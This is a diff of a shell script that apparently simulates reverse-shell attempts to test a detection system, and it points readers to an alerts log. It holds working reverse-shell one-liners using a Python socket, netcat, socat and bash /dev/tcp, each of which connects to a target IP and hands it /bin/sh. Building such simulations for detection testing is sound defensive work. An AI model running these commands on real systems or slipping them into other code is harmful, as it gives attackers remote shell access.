@@ -15,7 +15,8 @@ echo "[*] Scenario 2: python socket"
 timeout 2 python3 -c "import socket,os,pty;s=socket.socket();s.connect(('${TARGET_IP}',9998));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')" 2>/dev/null || true
 sleep 1
 
-echo "[*] Scenario 3: nc"
-timeout 2 nc "${TARGET_IP}" 9997 -e /bin/sh 2>/dev/null || true
+echo "[*] Scenario 3: socat"
+timeout 2 socat TCP:${TARGET_IP}:9997 EXEC:/bin/sh 2>/dev/null || \
+timeout 2 bash -c "exec 3<>/dev/tcp/${TARGET_IP}/9997; cat <&3 | sh >&3 2>&3" 2>/dev/null || true
 
 echo "[+] Simulation complete. Check /var/log/rsbp/alerts.jsonl for detections."
